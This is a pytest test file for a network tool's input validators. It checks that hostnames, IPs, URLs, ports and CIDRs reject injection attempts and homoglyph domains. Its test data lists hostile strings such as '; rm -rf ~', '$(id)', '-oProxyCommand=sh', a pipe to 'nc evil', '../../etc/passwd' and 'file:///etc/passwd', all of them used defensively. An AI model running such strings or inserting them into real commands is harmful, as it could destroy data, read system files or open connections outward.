# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2026 Denis

import pytest

from netpulse import validators as v
from netpulse.validators import ValidationError

INJECTIONS = [
    "; rm -rf ~",
    "example.com; rm -rf ~",
    "$(id)",
    "example.com$(id)",
    "`id`",
    "ex`id`ample.com",
    "--help",
    "-oProxyCommand=sh",
    "-oProxyCommand=touch /tmp/x",
    "example.com\nid",
    "example.com\r\nHost: evil",
    "example.com\x00",
    "example.com && id",
    "example.com | nc evil 1",
    "a b",
    "../../etc/passwd",
    "example.com>out",
    "'example.com'",
    '"example.com"',
    "example.com\t-c1",
    "",
    "   ",
    "-",
    "-1.1.1.1",
]


@pytest.mark.parametrize("bad", INJECTIONS)
def test_hostname_rejects_injection(bad):
    with pytest.raises(ValidationError):
        v.hostname(bad)


@pytest.mark.parametrize("bad", INJECTIONS)
def test_host_or_ip_rejects_injection(bad):
    with pytest.raises(ValidationError):
        v.host_or_ip(bad)


@pytest.mark.parametrize("bad", INJECTIONS)
def test_dns_name_rejects_injection(bad):
    with pytest.raises(ValidationError):
        v.hostname(bad, dns_name=True)


@pytest.mark.parametrize(
    "good,expected",
    [
        ("example.com", "example.com"),
        ("Example.COM", "example.com"),
        ("fedoraproject.org.", "fedoraproject.org."),
        ("localhost", "localhost"),
        ("a-b.c-d.example", "a-b.c-d.example"),
        ("3com.com", "3com.com"),
        ("bücher.de", "xn--bcher-kva.de"),
        ("münchen.de", "xn--mnchen-3ya.de"),
        ("пример.рф", "xn--e1afmkfd.xn--p1ai"),
        ("例え.テスト", "xn--r8jz45g.xn--zckzah"),
        ("  example.com  ", "example.com"),
    ],
)
def test_hostname_accepts(good, expected):
    assert v.hostname(good) == expected


@pytest.mark.parametrize(
    "bad",
    [
        "exa_mple.com",  # underscore not allowed in hostnames
        "-example.com",
        "example-.com",
        "exa..mple.com",
        "a" * 64 + ".com",
        ".".join(["a" * 60] * 5),  # > 253
        "1.2.3.999",  # numeric TLD → not a valid IP either
        "example.com/path",
        "user@example.com",
        "example.com:80",
    ],
)
def test_hostname_rejects_invalid(bad):
    with pytest.raises(ValidationError):
        v.hostname(bad)


@pytest.mark.parametrize(
    "homoglyph",
    [
        "аpple.com",  # Cyrillic а + Latin
        "pаypal.com",  # Cyrillic а inside
        "gοogle.com",  # Greek omicron
        "xn--pple-43d.com",  # punycode of "аpple" (Cyrillic а + Latin)
        "micrоsoft.com",  # Cyrillic о
    ],
)
def test_hostname_rejects_mixed_script_homoglyphs(homoglyph):
    with pytest.raises(ValidationError, match=r"mixes|punycode"):
        v.hostname(homoglyph)


def test_dns_name_allows_underscores_and_root():
    assert v.hostname("_dmarc.example.com", dns_name=True) == "_dmarc.example.com"
    assert v.hostname("_sip._tcp.example.com", dns_name=True) == "_sip._tcp.example.com"
    assert v.hostname(".", dns_name=True) == "."


@pytest.mark.parametrize(
    "value,expected",
    [
        ("1.1.1.1", "1.1.1.1"),
        ("2606:4700:4700::1111", "2606:4700:4700::1111"),
        ("[::1]", "::1"),
        ("2001:DB8::1", "2001:db8::1"),
        ("fedoraproject.org", "fedoraproject.org"),
    ],
)
def test_host_or_ip(value, expected):
    assert v.host_or_ip(value) == expected


def test_scope_ids():
    with pytest.raises(ValidationError):
        v.host_or_ip("fe80::1%eth0")
    assert v.host_or_ip("fe80::1%eth0", allow_scope=True) == "fe80::1%eth0"
    with pytest.raises(ValidationError):
        v.host_or_ip("fe80::1%eth0;id", allow_scope=True)
    with pytest.raises(ValidationError):
        v.ip_address("10.0.0.1%eth0", allow_scope=True)


@pytest.mark.parametrize("bad", ["1.1.1", "256.1.1.1", "1.1.1.1.1", "::g", "1.1.1.1/24"])
def test_ip_rejects(bad):
    with pytest.raises(ValidationError):
        v.ip_address(bad)


def test_int_range_clamps():
    assert v.int_range("500", 1, 100, "count", default=4) == 100
    assert v.int_range(-3, 1, 100, "count", default=4) == 1
    assert v.int_range(None, 1, 100, "count", default=4) == 4
    assert v.int_range("", 1, 100, "count", default=4) == 4
    for bad in ("4; id", "1e3", "four", True, "0x10"):
        with pytest.raises(ValidationError):
            v.int_range(bad, 1, 100, "count", default=4)


def test_float_range_clamps():
    assert v.float_range("0.01", 0.2, 60, "interval", default=1) == 0.2
    assert v.float_range(2.5, 0.2, 60, "interval", default=1) == 2.5
    for bad in ("nan", "inf", "1;id", True):
        with pytest.raises(ValidationError):
            v.float_range(bad, 0.2, 60, "interval", default=1)


def test_choice_allow_list():
    assert v.choice("A", ["A", "AAAA"], "type") == "A"
    assert v.choice(None, ["A"], "type", default="A") == "A"
    for bad in ("a", "A; id", "-t", ["A"], 1):
        with pytest.raises(ValidationError):
            v.choice(bad, ["A", "AAAA"], "type")


def test_boolean():
    assert v.boolean(True, "x") is True
    assert v.boolean("false", "x") is False
    assert v.boolean(None, "x", default=True) is True
    with pytest.raises(ValidationError):
        v.boolean("yes please", "x")


def test_ports():
    assert v.port_list("22, 80 443,80") == [22, 80, 443]
    assert v.port_list([443]) == [443]
    with pytest.raises(ValidationError):
        v.port_list(list(range(1, 12)))
    for bad in ("0", "65536", "-1", "22;id", "http"):
        with pytest.raises(ValidationError):
            v.port_list(bad)


def test_cidr():
    assert str(v.cidr("192.168.1.10/24").network) == "192.168.1.0/24"
    assert str(v.cidr("10.0.0.1 255.0.0.0").network) == "10.0.0.0/8"
    assert str(v.cidr("2001:db8::1/48").network) == "2001:db8::/48"
    assert str(v.cidr("10.1.2.3").network) == "10.1.2.3/32"
    for bad in ("10.0.0.0/33", "foo/24", "-10.0.0.0/8", "10.0.0.0/8; id"):
        with pytest.raises(ValidationError):
            v.cidr(bad)


@pytest.mark.parametrize(
    "value,expected",
    [
        ("example.com", "https://example.com/"),
        ("http://Example.com:8080/a?b=1", "http://example.com:8080/a?b=1"),
        ("https://bücher.de/", "https://xn--bcher-kva.de/"),
        ("https://[2606:4700::1111]/", "https://[2606:4700::1111]/"),
        ("https://1.1.1.1", "https://1.1.1.1/"),
    ],
)
def test_url_accepts(value, expected):
    assert v.url(value) == expected


@pytest.mark.parametrize(
    "bad",
    [
        "ftp://example.com/",
        "file:///etc/passwd",
        "https://user:pw@example.com/",
        "https://example.com/ a",
        "https://exa mple.com/",
        "-K/etc/passwd",
        "https://$(id).com/",
        "https://example.com:99999/",
        "https://example.com/\nX: y",
        "gopher://example.com",
    ],
)
def test_url_rejects(bad):
    with pytest.raises(ValidationError):
        v.url(bad)


def test_resolver():
    assert v.resolver("system", None) is None
    assert v.resolver("1.1.1.1", None) == "1.1.1.1"
    assert v.resolver("custom", "9.9.9.10") == "9.9.9.10"
    assert v.resolver("custom", "dns.quad9.net") == "dns.quad9.net"
    with pytest.raises(ValidationError):
        v.resolver("custom", "-p 5353")
    with pytest.raises(ValidationError):
        v.resolver("4.4.4.4", None)
